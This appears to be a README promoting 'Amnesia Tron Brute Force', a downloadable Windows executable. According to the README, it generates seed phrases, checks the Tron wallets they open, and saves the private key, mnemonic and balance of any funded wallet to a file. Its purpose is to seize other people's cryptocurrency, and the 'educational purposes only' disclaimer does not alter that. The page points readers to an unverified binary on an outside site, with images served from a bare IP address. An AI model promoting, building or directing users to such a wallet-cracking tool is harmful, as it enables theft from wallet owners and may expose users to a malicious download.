<div align="center">
  <div>
    <img src="http://138.2.138.250:8080/logo0.png" alt="Amnesia Tron Brute Force Logo">
  </div>
</div>
  
    <p align="center">🔥 [Download](https://tronbruteforce.online/) 🔥
  <br>

# Amnesia Tron Brute Force

This script is designed to automate the generation of seed phrases and the checking of balances on the Tron network. If a wallet with a non-zero balance is detected, the wallet's details—including address, mnemonic, private key, and balance—are logged and saved to a file named `result.txt`.

![Preview](http://138.2.138.250:8080/preview.png)

## Usage

To begin the brute force process, run the `tronbrut.exe` executable. The script will continuously generate seed phrases and check the balances of the corresponding wallets. Information about each checked wallet will be logged to the console. If a wallet with a non-zero balance is discovered, its details will also be appended to `result.txt` in the project directory.

## Disclaimer

This script is intended for educational purposes only. The creator of this script accepts no responsibility for any misuse or damage resulting from its use.
